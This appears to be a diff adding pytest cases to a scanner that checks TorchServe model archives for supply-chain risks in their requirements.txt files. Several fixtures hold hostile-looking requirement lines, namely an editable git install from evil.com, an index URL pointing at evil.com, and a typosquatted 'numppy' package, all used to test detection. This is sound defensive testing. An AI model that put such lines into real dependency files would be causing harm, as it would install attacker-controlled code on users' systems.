@@ -535,6 +535,29 @@ def test_scan_flags_editable_git_requirements_as_warning(tmp_path: Path) -> None
     assert "git_install" in reasons
 
 
+def test_scan_flags_editable_equals_git_requirements_as_warning(tmp_path: Path) -> None:
+    manifest = {"model": {"handler": "handler.py", "serializedFile": "weights.bin"}}
+    mar_path = _create_mar_archive(
+        tmp_path,
+        manifest=manifest,
+        entries={
+            "handler.py": b"def handle(data, context):\n    return {'ok': True}\n",
+            "weights.bin": b"weights",
+            "requirements.txt": b"--editable=git+https://evil.com/repo#egg=evilpkg\n",
+        },
+        filename="requirements_editable_equals_git.mar",
+    )
+
+    result = TorchServeMarScanner().scan(str(mar_path))
+    requirements_failures = _failed_checks(result, "TorchServe Requirements Supply Chain Analysis")
+
+    assert len(requirements_failures) == 1
+    assert requirements_failures[0].severity == IssueSeverity.WARNING
+    reasons = {finding["reason"] for finding in requirements_failures[0].details.get("findings", [])}
+    assert "editable_install" in reasons
+    assert "git_install" in reasons
+
+
 def test_scan_flags_remote_find_links_equals_and_short_forms_as_warning(tmp_path: Path) -> None:
     manifest = {"model": {"handler": "handler.py", "serializedFile": "weights.bin"}}
     mar_equals_path = _create_mar_archive(
@@ -613,6 +636,26 @@ def test_scan_accepts_local_find_links_and_pypi_short_index(tmp_path: Path) -> N
     assert requirements_checks[0].status == CheckStatus.PASSED
 
 
+def test_scan_ignores_missing_index_url_value(tmp_path: Path) -> None:
+    manifest = {"model": {"handler": "handler.py", "serializedFile": "weights.bin"}}
+    mar_path = _create_mar_archive(
+        tmp_path,
+        manifest=manifest,
+        entries={
+            "handler.py": b"def handle(data, context):\n    return {'ok': True}\n",
+            "weights.bin": b"weights",
+            "requirements.txt": b"--index-url\nnumpy==1.26.4\n",
+        },
+        filename="requirements_missing_index_value.mar",
+    )
+
+    result = TorchServeMarScanner().scan(str(mar_path))
+    requirements_checks = _checks_named(result, "TorchServe Requirements Supply Chain Analysis")
+
+    assert len(requirements_checks) == 1
+    assert requirements_checks[0].status == CheckStatus.PASSED
+
+
 def test_scan_bounds_requirements_reads_to_dedicated_limit(
     tmp_path: Path,
     monkeypatch: pytest.MonkeyPatch,
@@ -654,3 +697,45 @@ def test_scan_without_requirements_txt_preserves_existing_behavior(tmp_path: Pat
         check for check in result.checks if check.name == "TorchServe Requirements Supply Chain Analysis"
     ]
     assert requirements_checks == []
+
+
+def test_scan_only_analyzes_exact_requirements_txt_filename(tmp_path: Path) -> None:
+    manifest = {"model": {"handler": "handler.py", "serializedFile": "weights.bin"}}
+    mar_path = _create_mar_archive(
+        tmp_path,
+        manifest=manifest,
+        entries={
+            "handler.py": b"def handle(data, context):\n    return {'ok': True}\n",
+            "weights.bin": b"weights",
+            "myrequirements.txt": b"--index-url=https://evil.com/simple\n",
+        },
+        filename="requirements_filename_prefix.mar",
+    )
+
+    result = TorchServeMarScanner().scan(str(mar_path))
+    requirements_checks = [
+        check for check in result.checks if check.name == "TorchServe Requirements Supply Chain Analysis"
+    ]
+    assert requirements_checks == []
+
+
+def test_scan_detects_typo_package_with_inline_hash_comment(tmp_path: Path) -> None:
+    manifest = {"model": {"handler": "handler.py", "serializedFile": "weights.bin"}}
+    mar_path = _create_mar_archive(
+        tmp_path,
+        manifest=manifest,
+        entries={
+            "handler.py": b"def handle(data, context):\n    return {'ok': True}\n",
+            "weights.bin": b"weights",
+            "requirements.txt": b"numppy#comment\n",
+        },
+        filename="requirements_typo_hash_comment.mar",
+    )
+
+    result = TorchServeMarScanner().scan(str(mar_path))
+    requirements_failures = _failed_checks(result, "TorchServe Requirements Supply Chain Analysis")
+
+    assert len(requirements_failures) == 1
+    assert any(
+        finding["reason"] == "typosquat_ml_package" for finding in requirements_failures[0].details.get("findings", [])
+    )
